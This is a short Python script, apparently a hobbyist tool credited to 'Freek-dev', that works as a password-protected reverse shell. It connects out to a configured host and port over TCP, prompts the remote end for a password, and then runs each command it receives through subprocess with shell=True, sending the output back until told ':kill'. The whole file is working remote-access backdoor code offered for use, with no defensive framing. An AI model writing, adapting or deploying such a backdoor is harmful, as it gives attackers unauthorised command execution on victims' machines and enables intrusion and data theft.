import subprocess
import socket 

host = '127.0.0.1'
port = 443
password = 'Enter A Password'

#check password
def Login():
    global s 
    s.send("[-] Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != password:
        Login()
    else:
        s.send("[+] Connected #> ") 
        shell()

#execute shell commands
def shell():
    while True:
        data = s.recv(1024)

        if data.strip() == ":kill":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
        output = proc.stdout.read() + proc.stderr.read() 
        s.send(output)           
        s.send('#> ')

#start script
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()    

#Created By Freek-dev